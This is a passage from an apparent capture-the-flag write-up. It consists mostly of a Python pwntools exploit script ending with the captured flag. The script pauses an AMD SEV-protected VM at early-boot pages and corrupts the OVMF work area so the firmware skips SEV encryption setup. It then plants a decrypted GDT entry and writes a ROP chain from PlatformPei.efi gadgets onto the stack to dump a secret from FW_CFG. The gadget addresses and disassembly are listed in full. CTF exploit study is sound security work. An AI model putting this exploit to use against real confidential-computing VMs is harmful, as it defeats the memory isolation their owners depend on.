        io.readuntil(b"Physical Adddress (hex):")
        io.sendline(hex(addr).encode("ascii"))
    
    def wait_till_watchpoint_hit(io):
        while True:
            wait_menu(io)
            io.sendline(b"6")
            res = io.readline()
            if res[:3] == b"Yes":
                break
    
    def clear_watchpoint(io):
        wait_menu(io)
        io.sendline(b"8")
    
    def resume_execution(io):
        wait_menu(io)
        io.sendline(b"7")
    
    def hack(cfg_select_item_ptr, cfg_read_bytes_ptr, ret_ptr, pop_ebp_ret, leave_ret, pop_eax_edi, pop_edx, pop_ecx_pop_ebx, io_read, io_write):
        io = remote(sys.argv[1], int(sys.argv[2]))
    
        r = io.readline().decode("ascii")
        info(f"POW: {r}")
        sol = do_pow(r)
        info(f"Solution: {sol}")
        io.sendline(sol.encode())
    
        io.readuntil(b"Here and ready for hacking!")
    
        # 0xa00000 access is sufficiently after the VM type is determined by OVMF and saved into the OVMF work area.
        early_boot_address = 0xa00000
        info(f"Pause at early boot page {hex(early_boot_address)}")
        pause_at_page(io, early_boot_address)
        info(f"Wait for page to be hit")
        wait_till_watchpoint_hit(io)
    
        # Corrupt the work area
        # This will cause OVMF to think that the VM is not a Secure VM, and will skip some code paths that setup SEV-related state.
        # Such state is the page table programming that programs memory to be encrypted when OVMF transitiongs on long mode.
        ovmf_work_area_pa = 0x808000
        info(f"Corrupt work area {hex(ovmf_work_area_pa)}")
        write_data(io, ovmf_work_area_pa, b"A" * 8)
    
        # The rest of the steps are unoptimized
        # The MMU fault sequence for OVMF can be determined by updating qemu's 'handle_mmu_fault' code to print out the address.
    
        # Wait till page table population
        page_table_addr_write = 0xe802000 #fragile
        info(f"Pause at page during page table creation {hex(page_table_addr_write)}")
        pause_at_page(io, page_table_addr_write)
        resume_execution(io)
    
        info(f"Read a bit of uart logs to make space in unix stream")
        tmp = read_until_fast(io, b"Loading DXE CORE at")
    
        info(f"Wait to hit write to page table")
        wait_till_watchpoint_hit(io)
    
        # Wait for accessed page just before the handoff to DXE
        page_before_handoff_to_dxe = 0xe7ff000 #fragile
        info(f"Pause at page before DXE handoff {hex(page_before_handoff_to_dxe)}")
        pause_at_page(io, page_before_handoff_to_dxe)
        resume_execution(io)
    
        info("Read a bit more of uart before DXE handoff")
        read_until_fast(io, b"PeiDelayedDispatchOnEndOfPei Count of dispatch cycles")
        wait_till_watchpoint_hit(io)
    
        # Wait till page table population is done.
        addr_towards_end_of_page_table_population = 0xef65000 #fragile
        info(f"Pause at page during page table population {hex(addr_towards_end_of_page_table_population)}")
        pause_at_page(io, addr_towards_end_of_page_table_population)
        resume_execution(io)
        wait_till_watchpoint_hit(io)
    
        pause_at_very_last_moment = 0xef65000
        info(f"Pause at last moment {hex(pause_at_very_last_moment)}")
        pause_at_page(io, pause_at_very_last_moment)
        resume_execution(io)
        wait_till_watchpoint_hit(io)
    
        stack_address = 0xab8af44 #fragile
        info(f"Pause at stack address {hex(stack_address)}")
        pause_at_page(io, stack_address)
        resume_execution(io)
        wait_till_watchpoint_hit(io)
    
        last_arr = [0xef66000, 0xef622f5, 0xef652f0, 0xef63256, 0xef64f16, 0xab8b120, 0xef652f0, 0xef65306, 0xab8af44, 0xef652f0, 0xef65306]
        for last in last_arr:
            info(f"Pause at last {hex(last)}")
            pause_at_page(io, last)
            resume_execution(io)
            wait_till_watchpoint_hit(io)
    
        # This step generates a new GDT entry in decrypted format since the VM would access the memory as unencrypted once the
        # VM changes to long mode. If this is not done, the VM will fault because the CPL, DPL checks would fail during RETF.
        # By having it written in decrypted format by the HV, the VM will read the data and pass the checks in the RETF instruction.
        gdt_base = 0xef662a0 # fragile
        cs_index = 0x38
        cs_descriptor = 0xaf9a000000ffff
        write_data(io, gdt_base + cs_index, p64(cs_descriptor))
    
        info("Prepare rop chain")
        inf_loop = 0xef652d7
        dump_addr = 0xB000000
        FW_CFG_IO_SELECTOR = 0x510
        FW_CFG_IO_DATA = 0x511
    
        # Overwrite the return address and load new code segment.
        # The code uses p32() since the VM is still in real mode - no paging, 32-bit.
        rop = p32(ret_ptr) + p32(cs_index)
    
        # The rest of rop chain is executing in long mode with paging enabled.
        # This leaves the VM in a difficult state for exploitation:
        # - the currently loaded OVMF modules are built for 32-bit and the 64-bit mode are not yet loaded.
        # - loading more modules (not tried) could be difficult since now memory accesses read the ciphertext,
        #   so the originally written firmware data and earlier saved state is now broken until encryption for
        #   the memory is re-enabled.
        # - generating new code is difficult since instruction fetches are always doing decryption.
        # - re-enabling encryption is difficult since the page table walks are always using encryption.
        #
        # True exploitation would be still possible but it requires help from the HV.
        #
        # For the purpose of the challenge, the VM only needs to read out the flag from the FW CFG and
        # copy it over to unencrypted memory. That's done by using portions of existing code and being
        # mindful that the instructions may differ between 32-bit and 64-bit mode.
        #
        # The rest of the rop chain uses gadgets from the 32-bit PlatformPei.efi for setting up
        # RDX, RAX, RDI, RCX, RBX and then portions of the IoRead and IoWrite functions to read the
        # flag. The FW_CFG interface using IO is fairly simple - choose entry using the IO_SELECTOR
        # and then use IO_DATA to read back.
        #
        # Finally, the VM enters and infinite loop to prevent any unwated crashes and leaves it to the HV
        # to read out the flag.
    
        # Select flag
        rop += p64(pop_edx) + p64(FW_CFG_IO_SELECTOR)
        flag_index = 47
        rop += p64(pop_eax_edi) + p64(flag_index) + p64(0)
        rop += p64(io_write) + p64(0) # pop ebp at end
    
        for i in range(64):
            rop += p64(pop_edx) + p64(FW_CFG_IO_DATA)
            rop += p64(pop_eax_edi) + p64(0) + p64(dump_addr + i)
            rop += p64(pop_ecx_pop_ebx) + p64(1) + p64(0)
            rop += p64(io_read) + p64(0) # pop edi at end
    
        rop += p64(inf_loop)
    
        # Align the rop-chain to 8-bytes
        rop = rop.ljust(len(rop) + (8 - len(rop) % 8), b"\x42")
    
        info(f"Overwrite stack address {hex(stack_address)}")
        write_data(io, stack_address, rop)
    
        # At this stage, all of state and rop-chain is prepared.
        # After resuming the VM is only a few hundreds of instructions to
        # enter the rop chain and dump the flag
        info("Clear watchpoint and resume execution")
        clear_watchpoint(io)
        resume_execution(io)
    
        # 5 seconds should be enough.
        info("Sleep for a bit and read the dumped data")
        time.sleep(5)
        data = read_data(io, dump_addr, 64)
    
        # Sanity check that flag is in the expected format.
        if data[0:3] != b"hxp":
            raise Exception(f"Flag not found. Got {data}")
        end_index = data.find(b"}")
        if end_index == -1:
            raise Exception(f"End of flag not found. Got {data}")
        flag = data[:end_index+1].decode("ascii")
        print(f"Flag: {flag}")
    
        exit(1)
    
    # To determine the load address for PlatformPei.efi, look for the following string in the OVMF boot log:
    #
    # Loading PEIM at 0x00000833F40 EntryPoint=0x0000083AF4B PlatformPei.efi
    #
    # The load address is 0x00000833F40 + .text RVA (usually 0x240)
    pei = ELF("./PlatformPei.debug")
    pei_load_addr = 0x00000833F40
    pei.address = pei_load_addr + pei.get_section_by_name(".text").header.sh_addr
    cfg_select_item = pei.symbols.get("QemuFwCfgSelectItem", None)
    cfg_read_bytes = pei.symbols.get("QemuFwCfgReadBytes", None)
    ret = cfg_select_item + 55
    pop_ebp_ret = pei_load_addr + 0x283
    leave_ret = pei_load_addr + 0x00000460
    
    # 0x00009e8a: pop eax; pop edi; ret;
    # 0x00009fab: pop edx; ret;
    # 0x0000a0bd: pop ecx; pop ebx; ret;
    
    # 0xa12f <@IoReadFifo32_Loop>: in     eax,dx
    # 0xa130 <@IoReadFifo32_Loop+1>:       mov    DWORD PTR [edi],eax
    # 0xa132 <@IoReadFifo32_Loop+3>:       add    edi,0x4
    # 0xa135 <@IoReadFifo32_Loop+6>:       loop   0xa12f <@IoReadFifo32_Loop>
    # 0xa137 <@IoReadFifo32_Done>: pop    edi
    # 0xa138 <@IoReadFifo32_Done+1>:       ret
    
    # 0x00001274 <+9>:     out    dx,ax
    # 0x00001276 <+11>:    pop    ebp
    # 0x00001277 <+12>:    ret
    
    # 0xa0de <@IoReadFifo8_Loop>:  in     al,dx
    #  0xa0df <@IoReadFifo8_Loop+1>:        mov    BYTE PTR [edi],al
    #  0xa0e1 <@IoReadFifo8_Loop+3>:        inc    edi
    #  0xa0e2 <@IoReadFifo8_Loop+4>:        loop   0xa0de <@IoReadFifo8_Loop>
    #  0xa0e4 <@IoReadFifo8_Done>:  pop    edi
    #  0xa0e5 <@IoReadFifo8_Done+1>:        re
    
    # 0xa1aa <@IoWriteFifo32_Loop+2>:      out    dx,eax
    # 0xa1ab <@IoWriteFifo32_Loop+3>:      add    esi,0x4
    # 0xa1ae <@IoWriteFifo32_Loop+6>:      loop   0xa1a8 <@IoWriteFifo32_Loop>
    # 0xa1b0 <@IoWriteFifo32_Done>:        pop    esi
    # 0xa1b1 <@IoWriteFifo32_Done+1>:      ret
    pop_eax_edi = 0x00009e8a + pei_load_addr
    pop_edx = 0x00009fab + pei_load_addr
    pop_ecx_pop_ebx = 0x0000a0bd + pei_load_addr
    io_write = pei_load_addr + 0x00001274
    io_read = pei_load_addr + 0xa0de
    
    # Necessary to skip the saving of rbp, modifying rbp
    cfg_select_item += 1
    cfg_read_bytes += 3
    
    num_tries=12
    for i in range(num_tries):
        info(f"Attempt {i+1}/{num_tries}")
        try:
            hack(cfg_select_item, cfg_read_bytes, ret, pop_ebp_ret, leave_ret, pop_eax_edi, pop_edx, pop_ecx_pop_ebx, io_read, io_write)
        except Exception as e:
            info(f"Fail: {e}")
            continue
        exit(0)
```

Flag: `hxp{m4sT3rS_0f_m3M0ry_C0rrUpt1ON_0wN_m3m0rY_eNcrYpt10n}`
